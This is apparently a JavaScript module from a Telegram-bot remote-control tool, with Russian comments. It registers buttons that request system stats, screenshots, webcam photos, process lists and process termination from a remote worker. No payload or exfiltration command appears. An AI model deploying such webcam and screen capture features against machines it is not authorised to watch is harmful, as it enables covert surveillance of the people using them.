// Monitoring and Screen Functions Index
// Раздел: 📊 Мониторинг и экран
// Группирует все функции мониторинга и управления экраном

const { handleSystemStats } = require('./stats');
const { handleScreenshot } = require('./screenshot');
const { handleWebcamPhoto } = require('./webcam');
const { handleProcessList, handleKillProcess } = require('./processes');

/**
 * Register all monitoring functions
 * 
 * @param {object} bot - Telegraf bot instance
 * @param {string} workerUrl - Worker URL
 */
function registerMonitoringHandlers(bot, workerUrl) {
  // Register callback handlers
  bot.action('system_stats', async (ctx) => {
    const userId = ctx.from?.id;
    await handleSystemStats(ctx, userId, workerUrl);
  });

  bot.action('screenshot', async (ctx) => {
    const userId = ctx.from?.id;
    await handleScreenshot(ctx, userId, workerUrl);
  });

  bot.action('webcam_photo', async (ctx) => {
    const userId = ctx.from?.id;
    await handleWebcamPhoto(ctx, userId, workerUrl);
  });

  bot.action('process_list', async (ctx) => {
    const userId = ctx.from?.id;
    await handleProcessList(ctx, userId, workerUrl);
  });

  bot.action('kill_process', async (ctx) => {
    // This will be handled with text input
    await ctx.reply('Введите имя процесса для завершения (например: chrome.exe):');
  });
}

/**
 * Handle text input for process killing
 * Exported separately to be used in bot.js
 * 
 * @param {object} ctx - Telegraf context
 * @param {number} userId - User ID
 * @param {string} workerUrl - Worker URL
 */
async function handleTextInputForProcessKill(ctx, userId, workerUrl) {
  if (ctx.message.reply_to_message?.text?.includes('Введите имя процесса')) {
    const processName = ctx.message.text.trim();
    await handleKillProcess(ctx, userId, processName, workerUrl);
  }
}

module.exports = {
  registerMonitoringHandlers,
  handleTextInputForProcessKill,
  handleSystemStats,
  handleScreenshot,
  handleWebcamPhoto,
  handleProcessList,
  handleKillProcess
};
